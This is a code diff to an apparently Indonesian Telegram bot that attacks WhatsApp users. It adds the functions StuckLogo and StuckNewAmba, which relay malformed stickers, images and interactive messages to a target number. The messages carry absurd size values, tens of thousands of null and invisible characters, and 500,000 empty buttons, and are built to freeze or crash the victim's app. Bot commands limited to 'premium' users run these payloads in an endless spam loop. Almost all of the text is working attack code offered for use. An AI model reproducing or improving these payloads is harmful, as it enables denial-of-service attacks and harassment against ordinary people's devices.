@@ -13,6 +13,7 @@ const chalk = require("chalk");
 const axios = require("axios");
 const moment = require("moment-timezone");
 const pino = require("pino");
+const crypto = require("crypto");
 const EventEmitter = require("events");
 const { tokenBot, ownerID } = require("./config");
 
@@ -223,66 +224,111 @@ async function ForcloseSTC(sock, target) {
   }
 }
 
-// ---------- NATIVE STC ----------
-async function nativestc(sock, target) {
+// ---------- STUCK LOGO (ganti nativestc) ----------
+async function StuckLogo(sock, target) {
+  await sock.relayMessage(target, {
+    stickerMessage: {
+      url: "https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true",
+      fileSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
+      fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
+      mediaKey: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY=",
+      mimetype: "image/webp",
+      height: 4294967295,
+      width: 4294967295,
+      directPath: "/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1",
+      fileLength: 9007199254740991,
+      mediaKeyTimestamp: 9007199254740991,
+      firstFrameLength: 4294967295,
+      firstFrameSidecar: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY=",
+      isAnimated: true,
+      pngThumbnail: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY=",
+      contextInfo: {
+        mentionedJid: [target],
+        quotedMessage: {
+          contactMessage: {
+            displayName: " ",
+            vcard: "\u0000".repeat(45000)
+          }
+        }
+      },
+      stickerSentTs: 9007199254740991,
+      isAvatar: true,
+      isAiSticker: true,
+      isLottie: true,
+      accessibilityLabel: "ꦾ".repeat(30000)
+    }
+  }, { participant: target });
+
   await sock.relayMessage(target, {
     groupStatusMessageV2: {
       message: {
         interactiveMessage: {
-          body: { text: "Asmodeus @shinracery" },
+          body: { text: "Vixzz Ganteng Bangettt" },
           nativeFlowMessage: { buttons: Array.from({ length: 500000 }, () => ({})) },
           contextInfo: {
-            mentionedJid: [target],
-            stickerMessage: {
-              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
-              fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
-              fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
-              mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
-              mimetype: "image/webp",
-              directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
-              fileLength: "10610",
-              mediaKeyTimestamp: "1775044724",
-              stickerSentTs: "1775044724091",
-            },
+            quotedMessage: {
+              contactMessage: { displayName: " ", vcard: "" }
+            }
+          }
+        }
+      }
+    }
+  }, { participant: target });
+
+  await sock.relayMessage(target, {
+    groupStatusMessageV2: {
+      message: {
+        interactiveResponseMessage: {
+          body: { text: "AmbaJahat", format: "DEFAULT" },
+          nativeFlowResponseMessage: {
+            name: "galaxy_message",
+            paramsJson: "\u2062".repeat(30000),
+            version: 3
           },
-        },
-      },
-    },
+          contextInfo: {
+            quotedMessage: {
+              contactMessage: { displayName: " ", vcard: "" }
+            }
+          }
+        }
+      }
+    }
   }, { participant: target });
 }
 
-// ---------- BULV1 ----------
-async function BulV1(sock, target) {
-  const mentioned = Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9999999) + "@s.whatsapp.net");
-
-  const audioMsg = {
-    audioMessage: {
-      url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
-      mimetype: "audio/mpeg",
-      fileSha256: Buffer.from("pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=", "base64"),
-      fileLength: "389948", seconds: 24, ptt: false,
-      mediaKey: Buffer.from("v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=", "base64"),
-      fileEncSha256: Buffer.from("fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4=", "base64"),
-      caption: "Cery",
-      contextInfo: { mentionedJid: mentioned },
-    },
-  };
-
-  const all = [audioMsg];
-  for (const data of all) {
-    const msg = await generateWAMessageFromContent(target, data, {});
-    await sock.relayMessage(target, msg.message, { messageId: msg.key.id, statusJidList: [target] });
-  }
-
-  for (let i = 0; i < 100; i++) {
-    const bruh = await generateWAMessageFromContent(target, {
-      interactiveMessage: {
-        body: { text: "!Shinra8man" },
-        nativeFlowMessage: { buttons: "{".repeat(500000) },
-      },
-    }, {});
-    await sock.relayMessage(target, { groupStatusMessageV2: { message: bruh.message } }, {});
-  }
+// ---------- STUCK NEW AMBA (ganti BulV1) ----------
+async function StuckNewAmba(sock, target) {
+  await sock.relayMessage(target, {
+    groupStatusMessageV2: {
+      message: {
+        interactiveMessage: {
+          body: {
+            text: "AmbaJahat || @vixzzoficialNe"
+          },
+          nativeFlowMessage: {
+            buttons: Array.from({ length: 500000 }, () => ({}))
+          },
+          contextInfo: {
+            mentionedJid: [target],
+            quotedMessage: {
+              imageMessage: {
+                url: "https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1",
+                mimetype: "image/jpeg",
+                fileSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
+                fileLength: 9007199254740991,
+                height: 4294967295,
+                width: 4294967295,
+                mediaKey: crypto.randomBytes(32).toString("base64"),
+                fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
+                directPath: "/m1/v/t24/00002299291718920200291920729100",
+                jpegThumbnail: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY="
+              }
+            }
+          }
+        }
+      }
+    }
+  }, { participant: target });
 }
 
 // ---------- IOSSWIPPER ----------
@@ -391,9 +437,8 @@ async function catchingOs(target) {
 
 // =====================================================
 // ============ SPAM LOOP ANTI-ERROR ==================
-//  Sistem: paralel, gak ada queue, gak ada lock
 // =====================================================
-const activeSpam = new Map(); // jobId -> { userId, stop, stats: {ok, fail} }
+const activeSpam = new Map();
 let spamCounter = 0;
 
 async function spamForever(ctx, label, target, tasks) {
@@ -427,7 +472,6 @@ async function spamForever(ctx, label, target, tasks) {
     iterasi++;
     let semuaOk = true;
 
-    // Semua task dijalankan, masing-masing di-protect try/catch
     for (const t of tasks) {
       try {
         await t.fn();
@@ -880,26 +924,26 @@ function getBugTasks(bugName, target) {
         { name: "ForcloseVIDEO", fn: () => ForcloseVIDEO(sock, target) },
         { name: "ForcloseDOC",   fn: () => ForcloseDOC(sock, target)   },
         { name: "ForcloseSTC",   fn: () => ForcloseSTC(sock, target)   },
-        { name: "nativestc",     fn: () => nativestc(sock, target)     },
-        { name: "BulV1",         fn: () => BulV1(sock, target)         },
+        { name: "StuckLogo",     fn: () => StuckLogo(sock, target)     },
+        { name: "StuckNewAmba",  fn: () => StuckNewAmba(sock, target)  },
       ];
     case "delayhard":
       return [
-        { name: "nativestc", fn: () => nativestc(sock, target) },
-        { name: "BulV1",     fn: () => BulV1(sock, target)     },
+        { name: "StuckLogo",    fn: () => StuckLogo(sock, target)    },
+        { name: "StuckNewAmba", fn: () => StuckNewAmba(sock, target) },
       ];
     case "ghost":
       return [
-        { name: "nativestc", fn: () => nativestc(sock, target) },
-        { name: "BulV1",     fn: () => BulV1(sock, target)     },
+        { name: "StuckLogo",    fn: () => StuckLogo(sock, target)    },
+        { name: "StuckNewAmba", fn: () => StuckNewAmba(sock, target) },
       ];
     case "forcezz":
       return [
         { name: "ForcloseVIDEO", fn: () => ForcloseVIDEO(sock, target) },
         { name: "ForcloseDOC",   fn: () => ForcloseDOC(sock, target)   },
         { name: "ForcloseSTC",   fn: () => ForcloseSTC(sock, target)   },
-        { name: "nativestc",     fn: () => nativestc(sock, target)     },
-        { name: "BulV1",         fn: () => BulV1(sock, target)         },
+        { name: "StuckLogo",     fn: () => StuckLogo(sock, target)     },
+        { name: "StuckNewAmba",  fn: () => StuckNewAmba(sock, target)  },
       ];
     case "xdios":
       return [
@@ -944,7 +988,6 @@ bot.on("text", async (ctx, next) => {
   const tasks = getBugTasks(bugName, target);
   if (!tasks.length) return ctx.reply("❌ Bug tidak dikenal.");
 
-  // ← LANGSUNG JALAN, TANPA QUEUE
   spamForever(ctx, label, target, tasks);
 });
 
@@ -1003,7 +1046,7 @@ bot.action("/setting_menu", async (ctx) => {
   } catch (err) { console.log("setting_menu gagal:", err?.response?.description || err.message); }
 });
 
-// =================== COMMAND MANUAL BUG (ANTI-QUEUE) ===================
+// =================== COMMAND MANUAL BUG ===================
 bot.command("delayhard", premGroupOnly(), async (ctx) => {
   const userId = ctx.from.id.toString();
   if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
@@ -1015,7 +1058,7 @@ bot.command("delayhard", premGroupOnly(), async (ctx) => {
   if (!target) return ctx.reply("❌ Nomor tidak valid...");
 
   const tasks = getBugTasks("delayhard", target);
-  spamForever(ctx, "delayhard", target, tasks); // ← langsung
+  spamForever(ctx, "delayhard", target, tasks);
 });
 
 bot.command("ghost", premGroupOnly(), async (ctx) => {
@@ -1131,30 +1174,30 @@ bot.on("callback_query", async (ctx) => {
     delay: {
       name: "𝖣𝖾𝗅𝖺𝗒 𝖡𝗋𝗎𝗍𝖺𝗅𝗂𝗍𝗒",
       tasks: [
-        { name: "BulV1-1",     fn: () => BulV1(sock, target)     },
-        { name: "nativestc-1", fn: () => nativestc(sock, target) },
-        { name: "BulV1-2",     fn: () => BulV1(sock, target)     },
-        { name: "nativestc-2", fn: () => nativestc(sock, target) },
+        { name: "StuckNewAmba-1", fn: () => StuckNewAmba(sock, target) },
+        { name: "StuckLogo-1",    fn: () => StuckLogo(sock, target)    },
+        { name: "StuckNewAmba-2", fn: () => StuckNewAmba(sock, target) },
+        { name: "StuckLogo-2",    fn: () => StuckLogo(sock, target)    },
       ],
     },
     blank: {
       name: "XDioS",
       tasks: [
-        { name: "catchingOs", fn: () => catchingOs(target)        },
-        { name: "iosswipper", fn: () => iosswipper(sock, target)  },
+        { name: "catchingOs", fn: () => catchingOs(target)       },
+        { name: "iosswipper", fn: () => iosswipper(sock, target) },
       ],
     },
     bulldozer: {
       name: "Force Freez",
       tasks: [
-        { name: "VIDEO-1",   fn: () => ForcloseVIDEO(sock, target) },
-        { name: "DOC-1",     fn: () => ForcloseDOC(sock, target)   },
-        { name: "BulV1-1",   fn: () => BulV1(sock, target)         },
-        { name: "native-1",  fn: () => nativestc(sock, target)     },
-        { name: "BulV1-2",   fn: () => BulV1(sock, target)         },
-        { name: "native-2",  fn: () => nativestc(sock, target)     },
-        { name: "STC-1",     fn: () => ForcloseSTC(sock, target)   },
-        { name: "VIDEO-2",   fn: () => ForcloseVIDEO(sock, target) },
+        { name: "VIDEO-1",        fn: () => ForcloseVIDEO(sock, target) },
+        { name: "DOC-1",          fn: () => ForcloseDOC(sock, target)   },
+        { name: "StuckNewAmba-1", fn: () => StuckNewAmba(sock, target)  },
+        { name: "StuckLogo-1",    fn: () => StuckLogo(sock, target)     },
+        { name: "StuckNewAmba-2", fn: () => StuckNewAmba(sock, target)  },
+        { name: "StuckLogo-2",    fn: () => StuckLogo(sock, target)     },
+        { name: "STC-1",          fn: () => ForcloseSTC(sock, target)   },
+        { name: "VIDEO-2",        fn: () => ForcloseVIDEO(sock, target) },
       ],
     },
     fc: {
@@ -1175,7 +1218,6 @@ bot.on("callback_query", async (ctx) => {
     return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
   }
 
-  // ← LANGSUNG JALAN, TANPA QUEUE & TANPA LOCK
   spamForever(ctx, method.name, target, method.tasks);
 });
 
